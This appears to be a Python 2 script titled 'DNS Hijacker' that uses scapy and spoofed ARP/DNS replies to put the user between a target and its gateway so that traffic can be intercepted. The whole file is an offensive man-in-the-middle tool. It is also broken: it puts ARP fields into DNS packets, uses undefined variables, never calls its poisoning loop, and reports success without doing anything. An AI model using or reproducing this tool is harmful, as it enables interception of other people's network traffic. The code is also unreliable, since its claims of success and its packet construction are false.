#Author: GrayFox 
#For team Cypher
#usr/env/python2
print (""" 
 ______   _        _______          __________________ _______  _______  _        _______  _______ 
(  __  \ ( (    /|(  ____ \|\     /|\__   __/\__    _/(  ___  )(  ____ \| \    /\(  ____ \(  ____ )
| (  \  )|  \  ( || (    \/| )   ( |   ) (      )  (  | (   ) || (    \/|  \  / /| (    \/| (    )|
| |   ) ||   \ | || (_____ | (___) |   | |      |  |  | (___) || |      |  (_/ / | (__    | (____)|
| |   | || (\ \) |(_____  )|  ___  |   | |      |  |  |  ___  || |      |   _ (  |  __)   |     __)
| |   ) || | \   |      ) || (   ) |   | |      |  |  | (   ) || |      |  ( \ \ | (      | (\ (   
| (__/  )| )  \  |/\____) || )   ( |___) (___|\_)  )  | )   ( || (____/\|  /  \ \| (____/\| ) \ \__
(______/ |/    )_)\_______)|/     \|\_______/(____/   |/     \|(_______/|_/    \/(_______/|/   \__/
                                                                                                   
Made By GrayFox""")
#Importations 
import sys, os, time
from scapy.all import *
import os
import signal
import threading
#Showing the DNS protocols in your net 
os.system ("cat /etc/resolv.conf")
os.system ("ip route show")
#Input
print ("The DNS spoofing is a ilicit action, please don't make anything ilegal")
os.system ("sleep 5")
target = raw_input("Chosse DNS>>>")
tunnel = raw_input("chosse the tunnel>>>")
packet = raw_input("Chosse the number of packets to send>>>")

#DNS Poison parameters
gateway_ip = tunnel
target_ip = target 
packet_count = packet
conf.iface = "wlan0"
conf.verb = 0

#Given an IP, get the MAC. For Recieve the package 
def get_mac(ip_address):
    #ARP request is constructed. sr function is used to send/ receive a layer 3 packet
    #Alternative Method using Layer 2: resp, unans =  srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address))
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s,r in resp:
        return r[ARP].hwsrc
    return None

#Crafting the packet and sending 
#Threading start
def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    sr(DNS(op=2 , pdst=gateway_ip, psrc=target_ip), count=5)
    sr(DNS(op=2 , pdst=target_ip,  psrc=gateway_ip), count=5)
    print("[*] Disabling IP forwarding")
    #Disable IP Forwarding on a mac
    os.system("sysctl -w net.inet.ip.forwarding=0")
    #kill process on a mac
    os.kill(os.getpid(), signal.SIGTERM)

#Keep sending false ARP replies to put our man in the middle to intercept packets
#This will use our interface MAC address as the hwsrc for the ARP reply
def arp_poison(gateway_ip, target_ip):
    print("[*] Started DNS Hijacker [CTRL-C to stop]")
    try:
        while True:
            send(DNS(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(DNS(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Stopped DNS Hijacker Restoring network")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)

#Start the program
print("[*] Starting The Hijacker")
print("[*] Enabling IP forwarding")
#Enable IP Forward on a MAC
os.system("sysctl -w net.inet.ip.forwarding=1")
print("[*] Gateway IP:"+tunnel)
print("[*] Target IP:"+target)
print("Hijacker has been succesfull, open your sniffer ;)")
sys.exit(0)

